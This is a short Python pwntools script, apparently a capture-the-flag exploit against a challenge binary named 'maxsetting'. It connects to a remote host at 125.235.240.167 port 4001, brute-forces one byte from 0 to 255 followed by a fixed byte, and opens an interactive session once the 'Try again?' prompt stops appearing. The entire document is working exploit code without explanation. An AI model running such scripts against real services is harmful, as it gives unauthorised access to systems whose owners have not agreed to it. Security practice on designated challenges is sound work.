from pwn import *
import time
#r = process("maxsetting")
r = remote("125.235.240.167",4001)
i = 0
while i <= 255:
	print i
	r.send(chr(i))
	time.sleep(0.1)
	r.send('\x12')
	try:
		print r.recvuntil("Try again?")
		r.send('y')
		time.sleep(0.1)
	except:
		r.interactive()
	i+=1
r.close()
